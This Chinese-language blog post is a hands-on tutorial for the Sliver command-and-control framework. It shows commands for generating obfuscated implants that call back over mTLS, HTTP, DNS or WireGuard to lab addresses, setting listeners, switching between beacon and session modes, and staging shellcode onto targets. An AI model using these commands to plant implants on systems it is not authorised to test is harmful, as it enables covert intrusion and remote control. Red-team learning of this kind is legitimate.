---
title: 玉 - Sliver - zha0gongz1
url: https://www.cnblogs.com/H4ck3R-XiX/p/17080163.html
source: 博客园 - zha0gongz1
date: 2023-02-03
fetch_date: 2025-10-04T05:33:11.287745
---

# 玉 - Sliver - zha0gongz1

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/zha0gongz1/)

# [zha0gongz1](https://www.cnblogs.com/zha0gongz1)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/zha0gongz1/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/zha0gongz1)
* 订阅
* [管理](https://i.cnblogs.com/)

# [玉 - Sliver](https://www.cnblogs.com/zha0gongz1/p/17080163.html "发布于 2023-02-02 17:31")

C2后起之秀Sliver使用记录

## 基操

**1.启动服务端**

```
./sliver-server_linux
```

**2.启用多客户端协同**

```
new-operator --name zha0gongz1 --lhost [serverip] #生成客户端配置文件
multiplayer #启用多用户（开启默认端口31337）
```

此时会在同级目录下生成`zha0gongz1_192.168.123.23.cfg`配置文件。该配置文件为校验信息，使用ECC非对称加密算法实现登录通信，如图:

![](https://img2023.cnblogs.com/blog/1449167/202302/1449167-20230201163026029-1117138971.jpg)

知识点：服务端默认监听的端口为`31337`，修改默认端口： `vim ~/.sliver/configs/server.json`

**3.客户端配置**

拷贝该配置文件到客户端，运行对应的客户端文件导入配置文件：

```
Linux：
./sliver-client_linux import /root/tool/zha0gongz1_192.168.123.23.cfg

windows:
sliver-client_windows.exe import /root/tool/zha0gongz1_192.168.123.23.cfg

macos:
sliver-client_macos import /root/tool/zha0gongz1_192.168.123.23.cfg
```

然后再运行客户端文件即可

**4.载荷生成**

命令格式如下：

```
generate --mtls <Server IP> --save ./test.exe --os Windows
```

支持协议：Mutual TLS协议、http协议、DNS协议、[WireGuard协议](https://cybernews.com/what-is-vpn/wireguard-protocol/)

生成时默认使用garble(旧版本使用gobfuscate)对implant源码进行混淆，防止被分析。可以使用 `--skip-symbols`参数禁用混淆。

知识点：gobfuscate，在源码层面修改变量以及代码结构，速度比较慢；garble是对中间编译环节进行混淆结构，速度较快也能混淆大部分符号等信息。

![](https://img2023.cnblogs.com/blog/1449167/202302/1449167-20230201162123036-1343985988.jpg)

**5.开启监听**

如上一步，我们生成shell所用的监听协议为mtls，故我们要配置mtls类型的监听。

控制台执行命令

```
mtls
```

通过输入jobs命令，可以查看目前开启的监听。

![](https://img2023.cnblogs.com/blog/1449167/202301/1449167-20230131182525008-1078426194.jpg)

默认端口是8888 如果要指定端口，执行命令:

```
mtls -l 9999  #设置监听

#同时记得更改生成exe时回连端口
generate --mtls 192.168.233.231:9999 --os windows --arch amd64 --format exe --save /home/kali/Tool/Sliver
```

查看生成过的implant:

```
implants
```

![](https://img2023.cnblogs.com/blog/1449167/202302/1449167-20230201111249936-1531281682.jpg)

**6.运行攻击载荷**

执行后，服务端和客户端都会得到如下会话消息，主要包含session id、外网IP、主机名、平台、时间等。

![](https://img2023.cnblogs.com/blog/1449167/202302/1449167-20230201111032381-1402310965.jpg)

**7.会话操作**

```
use id          #进入会话
sessions -i id  #进入会话
sessions -k id  #结束会话
```

通过help命令，我们可以得到相关的执行命令

![](https://img2023.cnblogs.com/blog/1449167/202302/1449167-20230201111038410-1350255987.jpg)

## 进阶

### 攻击载荷

*模式分类*

Sliver 设计的 Implants 具备两种模式：session 模式（默认） 和 beacon 模式，区别在于beacon 模式属于异步通信方式，即执行累计的任务后，定期连接服务端返回数据，该模式与CobaltStrike 的通信方式相同，而 session 模式则进行持久连接，前者通信更加隐蔽，后者执行命令响应速度更快。当前 Implants 可由 beacon 模式切换至 session 模式，反之的功能官方尚未实现。

```
#生成beacon模式的攻击载荷
generate beacon --http 192.168.233.231 --save ~/
```

*通信分类*

Sliver 的通信方式有很大创新，相较于行业内流行C2新增加的通信方式有 MTLS（交互身份验证协议）和 WireGuard（VPN 协议），这两种通信方式都十分隐蔽，不容易被流量设备检测发现。

![](https://img2023.cnblogs.com/blog/1449167/202302/1449167-20230202171848232-1315471613.png)

另外，Sliver 开发了一个多协议多 ioc 控制功能，即可以使用多种通信方式不同的ioc 进行控制，避免生成的单一通信或者ioc 连接失败。通信协议顺序优先级由高到低依次为 MTLS -> WG -> HTTP（S）-> DNS。

```
#创建多通信：
generate --mtls example.com --http foobar.com --dns 1.ss.org

#多ioc随机连接:
generate --mtls foo.com,bar.com,baz.com --strategy r
```

#### 无阶段加载方式

*Implant*

使用generate命令在C2服务器上生成Implant，可以使用`help generate`命令查看详细介绍。以下是比较重要的参数选择：

```
--mtls 192.168.233.231: 指定implant使用相互验证的TLS协议连接到 Sliver服务器。其他选项如`--wg`用于 WireGuard连接，`--http`用于 HTTP(S)连接或`--dns`用于基于DNS的C2连接。

--os windows: 指定在Windows上运行的implant程序（默认设置），同时也支持生成 MacOS 和 Linux的攻击载荷。

--arch amd64: 指定64位攻击载荷（也是默认值，可以省略）。使用`--arch 386`作为32位版本。

--format exe: 指定为exe可执行文件（同样是默认值），其他选项包括针对动态库的 `--format shared`、Windows 服务二进制文件的`--format service`（可与 psexec 命令一起使用）和 shellcode（仅限 Windows）。

--save /home/kali/Tool/Sliver: 指定生成文件存放的目录位置
```

![](https://img2023.cnblogs.com/blog/1449167/202302/1449167-20230202155547156-1084346249.jpg)

命令示例：

```
generate --mtls 192.168.233.231 --os windows --arch amd64 --format exe --save /home/kali/Tool/Sliver/
```

#### 阶段加载方式

*Stager*

Sliver implant是用Go语言编写的，而Go二进制文件的体积是众所周知的大。implant包含许多功能，但是它的大小有10MB作用，将来可能会更大，而一个stager可以只有几KB甚至简短几行的二进制代码。所以，在某些场景中，为了尽量降低暴露风险，使用stager更为妥当。

stager的工作方式比较简单（参见[官方文档](https://github.com/BishopFox/sliver/wiki/Stagers)）。首先，在控制台中创建一个配置文件profile，定义implant基本配置。 然后，为其创建一个“stage监听器”（为第二阶段植入shellcode提供服务），监听器可以通过TCP连接或通过HTTP(S)为其提供服务。最后，就是在目标机器下载并运行shellcode。

![](https://img2023.cnblogs.com/blog/1449167/202302/1449167-20230202165438548-1823427500.jpg)

对于Stager，可以通过C/C++、Go、Rust等语言自定义构造加载器来加载运行，并最终植入implant，进行后渗透操作。

## 结语

本文偏重教程，也是我实践学习过程中的记录，文中如有不妥之处，还望多斧正。随着Sliver团队不断完善，更新学习仍会继续...

朋友可以背叛你，但技术和身材不会

posted @
2023-02-02 17:31
[zha0gongz1](https://www.cnblogs.com/zha0gongz1)
阅读(1463)
评论(0)

收藏
举报

刷新页面[返回顶部](#top)

[![](https://img2024.cnblogs.com/blog/35695/202508/35695-20250830121216742-1062949948.jpg)](https://developer.huawei.com/consumer/cn/activity/digixActivity/digixcmsdetail/101750143863263087?ha_source=BKYQ3&ha_sourceId=89000408)

### 公告

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250923174722171-270282128.jpg)](https://qoder.com/)

[博客园](https://www.cnblogs.com/)
  ©  2004-2025

[![](//assets.cnblogs.com/images/ghs.png)](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33010602011771)
[浙ICP备2021040463号-3](https://beian.miit.gov.cn)